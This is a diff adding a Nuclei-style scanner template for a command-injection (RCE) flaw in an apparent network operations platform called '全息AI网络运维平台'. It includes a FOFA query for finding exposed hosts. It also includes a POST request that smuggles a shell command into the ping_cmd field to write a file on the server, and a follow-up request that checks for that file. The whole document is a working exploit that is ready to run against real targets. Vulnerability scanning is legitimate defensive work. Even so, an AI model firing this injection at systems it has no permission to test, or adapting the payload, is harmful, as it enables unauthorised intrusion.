@@ -1,0 +1,45 @@
+id: qunxiAI-ajax-cloud-router-config-RCE
+
+info: 
+  name: 全息AI网络运维平台ajax_cloud_router_config.php存在命令执行
+  author: g3m
+  severity: high
+  metadata: 
+    fofa-query: body="全息AI网络运维平台"
+
+http:
+  - raw:
+
+    - |
+      @timeout 25s
+      POST /nmss/cloud/Ajax/ajax_cloud_router_config.php HTTP/1.1
+      Host: {{Hostname}}
+      Content-Length: 46
+      Cache-Control: max-age=0
+      Upgrade-Insecure-Requests: 1
+      Content-Type: application/x-www-form-urlencoded
+
+      ping_cmd=8.8.8.8|echo "test" > test.txt
+
+      
+    - |
+      @timeout 25s
+      GET /nmss/cloud/Ajax/test.txt HTTP/1.1
+      Host: {{Hostname}}
+      Upgrade-Insecure-Requests: 1
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words: 
+        - "test"
+        part: body
+
+      - type: status
+        status:
+          - 200
